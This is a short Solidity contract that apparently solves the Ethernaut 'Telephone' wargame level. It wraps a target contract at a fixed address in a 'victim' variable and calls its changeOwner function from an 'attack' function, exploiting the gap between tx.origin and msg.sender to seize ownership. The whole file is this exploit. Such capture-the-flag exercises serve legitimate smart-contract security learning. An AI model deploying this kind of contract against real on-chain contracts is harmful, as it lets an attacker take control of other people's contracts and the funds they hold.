// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneOwner {
    Telephone victim;
    constructor() public {
        victim = Telephone(0xe3248662E58d5C1ef5d9f4E121A0c2eAB8BE48f5);
    }

    function attack (address _newOwner) public {
        victim.changeOwner(_newOwner);
    }
}